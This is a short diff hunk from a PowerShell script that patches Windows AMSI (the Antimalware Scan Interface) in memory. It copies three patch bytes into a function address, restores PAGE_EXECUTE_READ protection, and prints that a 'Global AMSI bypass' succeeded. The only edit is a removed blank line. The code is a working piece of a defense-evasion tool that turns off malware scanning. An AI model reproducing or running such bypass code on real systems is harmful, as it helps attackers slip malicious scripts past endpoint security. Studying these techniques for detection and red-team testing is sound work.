@@ -39,5 +39,4 @@ $patchBytes = ([byte[]](72,49,219))
 [System.Runtime.InteropServices.Marshal]::Copy($patchBytes, 0, $funcAddr2, 3)
 Write-Host "[*] Restoring memory protection to PAGE_EXECUTE_READ" -ForeGroundColor Cyan
 $vp.Invoke($funcAddr2, 3, 0x20, [ref]$oldProtectionBuffer) | out-null
-
 Write-Host "[!] Global AMSI bypass completed successfully!" -ForeGroundColor Green
